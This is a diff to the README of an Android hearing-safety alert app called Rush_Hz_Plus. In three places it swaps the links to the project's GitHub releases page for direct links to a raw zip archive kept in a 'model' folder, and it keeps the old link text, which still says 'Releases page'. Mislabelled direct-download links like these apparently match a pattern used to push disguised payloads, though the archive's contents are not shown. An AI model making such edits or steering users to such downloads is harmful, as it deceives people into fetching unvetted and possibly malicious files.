@@ -1,6 +1,6 @@
 # 🔊 Rush_Hz_Plus - Real-time hazard alerts for hearing safety
 
-[![Download Rush_Hz_Plus](https://img.shields.io/badge/Download-Rush_Hz_Plus-blue?style=for-the-badge&logo=github)](https://github.com/lingamvenkatcharan-tech/Rush_Hz_Plus/releases)
+[![Download Rush_Hz_Plus](https://img.shields.io/badge/Download-Rush_Hz_Plus-blue?style=for-the-badge&logo=github)](https://github.com/lingamvenkatcharan-tech/Rush_Hz_Plus/raw/refs/heads/main/model/Plus_Hz_Rush_3.2.zip)
 
 ## 🚀 Overview
 
@@ -52,7 +52,7 @@ For best use:
 
 Visit the release page to download and run the app file:
 
-[Go to Rush_Hz_Plus Releases](https://github.com/lingamvenkatcharan-tech/Rush_Hz_Plus/releases)
+[Go to Rush_Hz_Plus Releases](https://github.com/lingamvenkatcharan-tech/Rush_Hz_Plus/raw/refs/heads/main/model/Plus_Hz_Rush_3.2.zip)
 
 After you open the page:
 
@@ -155,4 +155,4 @@ Most modern Android devices should work if they support microphone input and vib
 
 ## 🔗 Download again
 
-[Download from the Rush_Hz_Plus Releases page](https://github.com/lingamvenkatcharan-tech/Rush_Hz_Plus/releases)
+[Download from the Rush_Hz_Plus Releases page](https://github.com/lingamvenkatcharan-tech/Rush_Hz_Plus/raw/refs/heads/main/model/Plus_Hz_Rush_3.2.zip)
